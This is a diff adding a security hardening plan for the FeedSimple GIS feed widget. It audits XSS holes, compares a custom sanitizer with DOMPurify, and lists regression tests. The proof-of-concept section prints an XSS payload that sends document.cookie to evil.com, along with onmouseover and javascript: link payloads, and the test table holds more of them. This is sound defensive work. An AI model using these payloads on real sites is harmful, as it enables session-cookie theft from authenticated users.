@@ -1,0 +1,460 @@
+# FeedSimple Security Hardening Plan
+
+> **Status:** Documented — implementation pending community member feedback
+> **Created:** 2026-04-01
+> **Source:** Esri community code review + 3-agent parallel research session
+
+---
+
+## Threat Model
+
+FeedSimple fetches arbitrary XML from any URL the admin configures. The threat is **not** only a
+malicious feed — it is a **legitimate, trusted feed that gets compromised**.
+
+A county emergency alert feed, a USGS earthquake feed, or a transit advisory feed could be:
+- Hacked at the source (CMS compromise injects payload into a description field)
+- Intercepted in transit (plain HTTP feeds have no transport integrity — MITM at a router or CDN level)
+- Redirected via DNS hijacking
+
+None of these require any mistake from the app administrator. The attack arrives in the data, not
+in the config. Because this is a GIS application embedded in a local government portal, users are
+often authenticated staff. A cookie-exfiltration payload in a feed description harvests those
+credentials automatically just by displaying a card.
+
+---
+
+## Confirmed Vulnerabilities (Audit 2026-04-01)
+
+### CRITICAL — Unsanitized feed content in `dangerouslySetInnerHTML`
+
+**File:** `feed-card.tsx:214`, `setting.tsx:970`
+
+The full pipeline has no sanitization at any point:
+```
+substituteTokens(tmpl, item) → convertTemplateToHtml() → dangerouslySetInnerHTML
+```
+
+Feed field values containing HTML tags (including event handlers, `<script>`, `<img onerror=...>`)
+pass straight through to the DOM. CDATA-wrapped content is also affected — `DOMParser` transparently
+unwraps `<![CDATA[...]]>` before our code sees it.
+
+**Proof of concept:**
+- Feed `<description>`: `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`
+- Template: `{{description}}`
+- Result: executes in browser without any user action
+
+### HIGH — `href` injection via `externalLink` filter
+
+**File:** `shared-code/mapsimple-common/token-renderer.ts:355`
+
+```typescript
+return `<a href="${url}" target="_blank" rel="noopener">View ↗</a>`
+```
+
+`url` is built by substituting feed field values into the `externalLinkTemplate`. Field values are
+not restricted, so a value containing `"` breaks the attribute boundary:
+
+- Field value: `foo" onmouseover="alert(document.cookie)"`
+- Output: `<a href="https://example.com/foo" onmouseover="alert(document.cookie)" ...>`
+
+This is clickless XSS — executes on hover.
+
+### MEDIUM — `javascript:` links via markdown syntax in feed data
+
+**File:** `shared-code/mapsimple-common/markdown-template-utils.ts:252`
+
+The link regex `[^)]+` does not exclude the `javascript:` protocol. A feed field value containing
+`[label](javascript:alert(1))` passes through `applyInlineFormatting()` as a clickable XSS link.
+
+### LOW — `rel="noopener"` missing `noreferrer` (3 locations)
+
+**File:** `shared-code/mapsimple-common/token-renderer.ts` (lines 326, 362)
+**File:** `shared-code/mapsimple-common/markdown-template-utils.ts:253`
+
+All three `<a>` tag generators use `rel="noopener"` but not `noreferrer`. Without `noreferrer`,
+the `Referer` header sent to external sites includes the portal URL, leaking the user's portal
+session path to any attacker-controlled server a feed link points at.
+
+### LOW — Missing `referrerpolicy` on `<img>` tags
+
+**File:** `shared-code/mapsimple-common/markdown-template-utils.ts:247`
+
+The image generator does not set `referrerpolicy="no-referrer"`. A compromised feed injecting
+`<img src="https://attacker.com/pixel.gif">` will receive the full portal URL in the `Referer`
+header from every user who views that card.
+
+### LOW — No payload size limit in `feed-fetcher.ts`
+
+**File:** `feed-simple/src/utils/feed-fetcher.ts`
+
+There is no check on response size. A compromised feed returning a 50 MB XML payload would parse
+in the main thread, freezing the browser tab. The existing `text.trim()` empty-check does not
+catch this.
+
+### LOW — No URL scheme validation in `feed-fetcher.ts`
+
+**File:** `feed-simple/src/utils/feed-fetcher.ts`
+
+`fetchFeed()` accepts any URL string. A compromised config or path could direct the widget to
+`file://`, `ftp://`, `javascript:`, or `data:` scheme URLs.
+
+---
+
+## What Is Protected (No Action Needed)
+
+| Location | Why it is safe |
+|----------|---------------|
+| `renderRawFields()` in `feed-card.tsx` | Uses JSX `{value}` — React auto-escapes. |
+| Expanded fields panel | Same — JSX rendering throughout. |
+| `autolink` filter character class | `[^\s<>"']` excludes `"` — attribute breakout blocked. |
+| `window.open(linkUrl, '_blank', 'noopener,noreferrer')` | Link button. Correct. |
+
+---
+
+## Research Results (2026-04-01)
+
+Three parallel research agents investigated three approaches. Full reasoning is preserved below.
+
+---
+
+### Option A: Custom DOMParser-Walk Sanitizer (Recommended)
+
+**Agent conclusion:** Recommended for this use case.
+
+**Reasoning:**
+
+1. Our HTML is machine-generated by audited, deterministic code (`convertTemplateToHtml`). The
+   output space is bounded and known.
+2. Feed field values enter the HTML as text content, not as raw HTML structural positions. The
+   mXSS vectors that DOMPurify specializes in (namespace confusion, template bypass, double-parse
+   discrepancy) are largely inapplicable to our threat surface.
+3. DOMParser parses the HTML string with the browser's own engine before we walk it — there is
+   no parser differential gap between "what we think the string says" and "what the browser renders."
+4. Zero new npm dependency. ~60 lines. Works in Jest+JSDOM out of the box.
+
+**Required enhancements over the naive approach:**
+
+1. Strip `url()` from all `style` attribute values (prevents CSS-based data exfiltration via
+   `background: url(https://attacker.com/...)` in the one attack path that is realistic in modern
+   browsers):
+   ```typescript
+   if (attrName === 'style') {
+     const cleaned = attr.value.replace(/url\s*\([^)]*\)/gi, '')
+     if (cleaned !== attr.value) el.setAttribute('style', cleaned)
+   }
+   ```
+
+2. Explicit `<template>` element guard — `querySelectorAll('*')` does not descend into `<template>`
+   content in all browsers:
+   ```typescript
+   const templates = Array.from((root as Element).querySelectorAll('template'))
+   for (const tmpl of templates) { tmpl.parentNode?.removeChild(tmpl) }
+   ```
+
+**Escalation criteria — switch to DOMPurify if:**
+- A bypass of the custom sanitizer is reported
+- The pipeline is extended to accept raw HTML from outside the markdown converter
+- Field values start reaching `style` attributes directly (e.g., `style="{{userStyle}}"`)
+- `trusted-types` CSP compatibility becomes a requirement
+
+**Complete implementation** (to be placed at `feed-simple/src/utils/sanitize-html.ts`):
+
+```typescript
+/**
+ * Lightweight HTML sanitizer for FeedSimple card templates.
+ *
+ * Uses DOMParser to build a real DOM tree, walks it, removes any element or
+ * attribute not in the explicit allowlist, strips javascript: and data: URIs
+ * and url() from style values, then returns the cleaned innerHTML.
+ *
+ * Scoped to the known output shape of convertTemplateToHtml() + substituteTokens().
+ * Not a general-purpose sanitizer.
+ */
+
+const ALLOWED_ELEMENTS = new Set<string>([
+  'p', 'h3', 'h4', 'h5', 'h6', 'ul', 'li', 'hr', 'div', 'span',
+  'strong', 'em', 'br',
+  'a', 'img',
+  'table', 'thead', 'tbody', 'tr', 'th', 'td',
+])
+
+const ALLOWED_ATTRS: Record<string, Set<string>> = {
+  a:     new Set(['href', 'target', 'rel']),
+  img:   new Set(['src', 'alt', 'style']),
+  div:   new Set(['style']),
+  span:  new Set(['style']),
+  table: new Set(['style']),
+  tr:    new Set(['style']),
+  th:    new Set(['style']),
+  td:    new Set(['style']),
+}
+
+const FORBIDDEN_URI_SCHEMES = ['javascript:', 'data:', 'vbscript:', 'mhtml:']
+
+function isSafeUrl(value: string): boolean {
+  const normalised = value.replace(/[\u0000-\u0020\u00ad\u200b-\u200d\ufeff]/g, '').toLowerCase()
+  return !FORBIDDEN_URI_SCHEMES.some(scheme => normalised.startsWith(scheme))
+}
+
+function sanitizeElement(el: Element): boolean {
+  const tag = el.tagName.toLowerCase()
+
+  if (!ALLOWED_ELEMENTS.has(tag)) {
+    const parent = el.parentNode
+    if (parent) {
+      while (el.firstChild) { parent.insertBefore(el.firstChild, el) }
+      parent.removeChild(el)
+    }
+    return false
+  }
+
+  const allowedForTag = ALLOWED_ATTRS[tag]
+  const attrsToRemove: string[] = []
+
+  for (let i = 0; i < el.attributes.length; i++) {
+    const attr = el.attributes[i]
+    const attrName = attr.name.toLowerCase()
+
+    if (attrName.startsWith('on')) { attrsToRemove.push(attr.name); continue }
+    if (!allowedForTag || !allowedForTag.has(attrName)) { attrsToRemove.push(attr.name); continue }
+
+    if (attrName === 'href' || attrName === 'src') {
+      if (!isSafeUrl(attr.value)) { attrsToRemove.push(attr.name); continue }
+    }
+
+    // Strip url() from style values (prevents CSS-based data exfiltration)
+    if (attrName === 'style') {
+      const cleaned = attr.value.replace(/url\s*\([^)]*\)/gi, '')
+      if (cleaned !== attr.value) el.setAttribute('style', cleaned)
+    }
+  }
+
+  for (const name of attrsToRemove) { el.removeAttribute(name) }
+  return true
+}
+
+function walkAndSanitize(root: Node): void {
+  // Explicitly remove <template> elements — querySelectorAll('*') does not
+  // always descend into template content in all browsers.
+  const templates = Array.from((root as Element).querySelectorAll('template'))
+  for (const tmpl of templates) { tmpl.parentNode?.removeChild(tmpl) }
+
+  // Process deepest nodes first so parent unwraps don't revisit sanitized children.
+  const elements = Array.from((root as Element).querySelectorAll('*'))
+  for (let i = elements.length - 1; i >= 0; i--) {
+    const el = elements[i]
+    if (!el.parentNode) continue
+    sanitizeElement(el)
+  }
+}
+
+export function sanitizeTemplateHtml(html: string): string {
+  if (!html || typeof html !== 'string') return ''
+  const doc = new DOMParser().parseFromString(html, 'text/html')
+  walkAndSanitize(doc.body)
+  return doc.body.innerHTML
+}
+```
+
+---
+
+### Option B: DOMPurify (Stronger, but not required for current threat surface)
+
+**Agent conclusion:** Viable, stronger mXSS protection, but adds a new dependency and requires
+careful configuration to avoid breaking table inline styles.
+
+**Key findings:**
+
+- Bundle: ~7–8 KB gzip. Acceptable.
+- Import: `import DOMPurify from 'dompurify'` — works with `allowSyntheticDefaultImports: true`
+  (already set in the project `tsconfig.json`).
+- **Critical pitfall:** DOMPurify strips `style` attributes by default. Our tables use inline
+  styles for borders, padding, and alignment. The config must explicitly allow `style` with a
+  `uponSanitizeAttribute` hook to restrict it per-element. Without this, all table rendering breaks.
+- Jest+JSDOM (v26, bundled in jest-environment-jsdom ^30.2.0): compatible out of the box.
+- `isomorphic-dompurify`: not needed — project runs browser-only.
+- `@esri/arcgis-html-sanitizer` (already in `client/package.json`): wraps `js-xss`, targets the
+  ArcGIS Online HTML spec — too restrictive for our inline-style table use case. Not viable.
+
+**Exact config if DOMPurify is chosen:**
+
+```typescript
+import DOMPurify from 'dompurify'
+
+const STYLE_ALLOWED_ON = new Set(['div', 'span', 'td', 'th', 'table', 'tr', 'p'])
+
+const FEED_PURIFY_CONFIG: DOMPurify.Config = {
+  ALLOWED_TAGS: [
+    'p', 'h3', 'h4', 'h5', 'h6', 'ul', 'ol', 'li', 'hr', 'div', 'span',
+    'strong', 'em', 'br', 'a', 'img',
+    'table', 'thead', 'tbody', 'tr', 'th', 'td',
+    '#text',
+  ],
+  ALLOWED_ATTR: ['style', 'href', 'target', 'rel', 'src', 'alt'],
+  ALLOW_ARIA_ATTR: false,
+  ALLOW_DATA_ATTR: false,
+  FORCE_BODY: false,
+  RETURN_DOM: false,
+  RETURN_DOM_FRAGMENT: false,
+}
+
+// Register once at module init — not inside render
+DOMPurify.addHook('uponSanitizeAttribute', (node, event) => {
+  if (event.attrName === 'style') {
+    if (!STYLE_ALLOWED_ON.has(node.nodeName.toLowerCase())) {
+      event.keepAttr = false
+    }
+  }
+})
+
+export function sanitizeFeedHtml(html: string): string {
+  return DOMPurify.sanitize(html, FEED_PURIFY_CONFIG)
+}
+```
+
+**Performance note:** ~4 ms for 200 cards per poll cycle. Cacheable with a `Map<string, string>`
+keyed on the raw HTML string, cleared on each feed refresh.
+
+---
+
+### Option C: `@esri/arcgis-html-sanitizer` (Already installed — Not viable)
+
+Already in `client/package.json` at `^4.1.0`. Wraps `js-xss`. Targets the ArcGIS Online supported
+HTML spec, which does not support inline `style` attributes on table cells. Using it would break
+all table rendering without significant allowlist customization that defeats its purpose.
+
+**Do not use for this case.**
+
+---
+
+## Defense-in-Depth: Additional Hardening (Same PR as Sanitizer)
+
+These are independent of the sanitizer choice and should be implemented alongside it.
+
+### 1. `rel="noopener noreferrer"` — 3 locations (1-word change each)
+
+| File | Location | Current | Fix |
+|------|----------|---------|-----|
+| `token-renderer.ts` | `applyAutolinkFilter()` ~line 326 | `rel="noopener"` | `rel="noopener noreferrer"` |
+| `token-renderer.ts` | `applyExternalLinkFilter()` ~line 362 | `rel="noopener"` | `rel="noopener noreferrer"` |
+| `markdown-template-utils.ts` | `applyInlineFormatting()` ~line 253 | `rel="noopener"` | `rel="noopener noreferrer"` |
+
+### 2. `referrerpolicy="no-referrer"` on `<img>` tags
+
+**File:** `shared-code/mapsimple-common/markdown-template-utils.ts:247`
+
+```typescript
+// Before
+'<img src="$2" alt="$1" style="max-width:100%; height:auto; display:block; margin:4px 0;">'
+
+// After
+'<img src="$2" alt="$1" referrerpolicy="no-referrer" crossorigin="anonymous" style="max-width:100%; height:auto; display:block; margin:4px 0;">'
+```
+
+Note: if DOMPurify is chosen instead of the custom sanitizer, `referrerpolicy` and `crossorigin`
+must be added to `ALLOWED_ATTR` — DOMPurify strips them by default.
+
+### 3. Payload size limit in `feed-fetcher.ts`
+
+Add after receiving text, before returning, in both `esriRequest` and native fetch paths:
+
+```typescript
+const MAX_PAYLOAD_BYTES = 5 * 1024 * 1024 // 5 MB hard limit
+
+if (text.length > MAX_PAYLOAD_BYTES) {
+  throw new Error(`Feed payload too large: ${text.length} bytes (limit: ${MAX_PAYLOAD_BYTES})`)
+}
+```
+
+### 4. URL scheme validation in `fetchFeed()`
+
+Add at the top of `fetchFeed()`, before any fetch attempt:
+
+```typescript
+const ALLOWED_SCHEMES = ['https:', 'http:']
+
+let parsedUrl: URL
+try {
+  parsedUrl = new URL(url)
+} catch {
+  throw new Error(`Invalid feed URL: ${url}`)
+}
+if (!ALLOWED_SCHEMES.includes(parsedUrl.protocol)) {
+  throw new Error(`Feed URL scheme not allowed: ${parsedUrl.protocol}`)
+}
+```
+
+Note: `http:` feeds fetched via the `esriRequest` proxy path do not expose the browser to MITM
+(the server-to-feed connection is the exposure). `http:` in the native fetch fallback does. Log a
+`debugLogger` warning when `http:` is used.
+
+---
+
+## CSP Considerations
+
+ArcGIS Online does not allow custom `Content-Security-Policy` response headers on deployed apps —
+Esri controls that layer. The platform's existing CSP is a partial backstop but not a primary
+defense. DOMPurify (or the custom sanitizer) must do all the work.
+
+If the ExB app's `index.html` is editable in your deployment, add:
+
+```html
+<meta http-equiv="Content-Security-Policy"
+      content="base-uri 'self'; object-src 'none';">
+```
+
+This prevents `<base href="...">` injection (which would redirect all relative links) and blocks
+`<object>`, `<embed>`, `<applet>` embeds — even if sanitization fails.
+
+---
+
+## Implementation Plan
+
+### Phase 1 — Core sanitization (implement when ready)
+
+| Task | File | Notes |
+|------|------|-------|
+| Create `sanitize-html.ts` | `feed-simple/src/utils/` | Full implementation above |
+| Call `sanitizeTemplateHtml()` in `renderTemplateContent` | `feed-card.tsx:213` | After `convertTemplateToHtml()` |
+| Call in settings preview | `setting.tsx:970` | Lower priority — admin content |
+
+### Phase 2 — Defense-in-depth (same PR, trivial)
+
+| Task | File | Effort |
+|------|------|--------|
+| Add `noreferrer` to 3 `rel=` attributes | `token-renderer.ts`, `markdown-template-utils.ts` | 3 words |
+| Add `referrerpolicy="no-referrer"` to `<img>` | `markdown-template-utils.ts:247` | 1 line |
+| Add payload size limit | `feed-fetcher.ts` | 4 lines |
+| Add URL scheme validation | `feed-fetcher.ts` | 8 lines |
+
+### Phase 3 — Tests
+
+Security regression test cases (add to `markdown-template-utils.test.ts` or new `sanitize-html.test.ts`):
+
+| Input | Expected | Tests |
+|-------|----------|-------|
+| `<p onclick="alert(1)">text</p>` | `<p>text</p>` | Event handler stripping |
+| `<a href="javascript:alert(1)">x</a>` | `<a>x</a>` | javascript: URI |
+| `<img src="data:image/png;base64,abc">` | `<img>` | data: URI |
+| `<script>alert(1)</script>` | `` | Script removal |
+| `<iframe src="https://evil.com"></iframe>` | `` | iframe removal |
+| `<div style="background:url(https://evil.com)">` | `<div style="background:">` | url() in style |
+| `<a href="  javascript:alert(1)">` | `<a>` | Leading whitespace bypass |
+| `<a href="JAVASCRIPT:alert(1)">` | `<a>` | Uppercase scheme bypass |
+| Valid table with inline styles | Unchanged | Tables survive sanitization |
+| Valid `<img>` with style | Unchanged | Images survive sanitization |
+
+---
+
+## Version Impact
+
+This change touches `shared-code/` (for `noreferrer`, `referrerpolicy`, payload limit) and
+`feed-simple/` (for the sanitizer itself and `fetchFeed` URL validation). Per the shared-code
+versioning rule, version bumps required in: **FS**, **QS**, **HS**.
+
+---
+
+## Pending
+
+- Community member's specific feedback / crafted payloads (to write targeted regression tests)
+- Final decision: custom sanitizer vs. DOMPurify (recommendation: custom, escalate if needed)
